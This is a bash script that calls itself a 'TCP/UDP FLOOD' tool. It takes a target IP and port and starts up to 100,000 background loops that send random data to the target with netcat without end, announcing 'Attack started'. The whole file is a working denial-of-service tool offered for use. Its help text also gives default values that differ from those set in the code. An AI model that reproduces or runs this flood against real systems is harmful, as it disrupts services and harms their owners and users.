#!/bin/bash

# Code by LeeOn123 - Bash Version
echo "--> C0de By Lee0n123 <--"
echo "#-- TCP/UDP FLOOD --#"

# Function to display help
show_help() {
    echo "Usage: $0 -i <IP> -p <PORT> [OPTIONS]"
    echo "Options:"
    echo "  -i, --ip        Host IP (required)"
    echo "  -p, --port      Port (required)"
    echo "  -c, --choice    UDP(y/n) [default: y]"
    echo "  -t, --times     Packets per one connection [default: 50000]"
    echo "  -th, --threads  Threads [default: 1000]"
    echo "  -h, --help      Show this help message"
    exit 0
}

# Default values
IP=""
PORT=""
CHOICE="y"
TIMES=50
THREADS=100000

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--ip)
            IP="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -c|--choice)
            CHOICE="$2"
            shift 2
            ;;
        -t|--times)
            TIMES="$2"
            shift 2
            ;;
        -th|--threads)
            THREADS="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            ;;
    esac
done

# Validate required arguments
if [[ -z "$IP" || -z "$PORT" ]]; then
    echo "Error: IP and Port are required!"
    show_help
fi

# Validate choice
if [[ "$CHOICE" != "y" && "$CHOICE" != "n" ]]; then
    echo "Error: Choice must be 'y' or 'n'"
    exit 1
fi

# Function for UDP flood
run_udp() {
    local id=$1
    local prefixes=("[*]" "[!]" "[#]")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    
    # Generate random data (1024 bytes)
    data=$(head -c 1024 /dev/urandom | base64)
    
    while true; do
        for ((x=0; x<TIMES; x++)); do
            # Using netcat for UDP sending
            echo "$data" | nc -u -w 0 "$IP" "$PORT" 2>/dev/null
        done
        echo "$prefix Sent!!!"
    done
}

# Function for TCP flood
run_tcp() {
    local id=$1
    local prefixes=("[*]" "[!]" "[#]")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    
    # Generate random data (16 bytes)
    data=$(head -c 16 /dev/urandom | base64)
    
    while true; do
        # Using netcat for TCP connection
        for ((x=0; x<TIMES; x++)); do
            echo "$data" | nc -w 5 "$IP" "$PORT" 2>/dev/null
        done
        echo "$prefix Sent!!!"
        sleep 0.1
    done
}

# Start threads
echo "Starting $THREADS threads..."
echo "Target: $IP:$PORT"
echo "Mode: $(if [[ "$CHOICE" == "y" ]]; then echo "UDP"; else echo "TCP"; fi)"
echo "Packets per connection: $TIMES"

for ((y=0; y<THREADS; y++)); do
    if [[ "$CHOICE" == "y" ]]; then
        run_udp "$y" &
    else
        run_tcp "$y" &
    fi
    # Small delay to prevent overwhelming the system
    sleep 0.01
done

echo "Attack started with $THREADS threads. Press Ctrl+C to stop."

# Wait for all background processes
wait
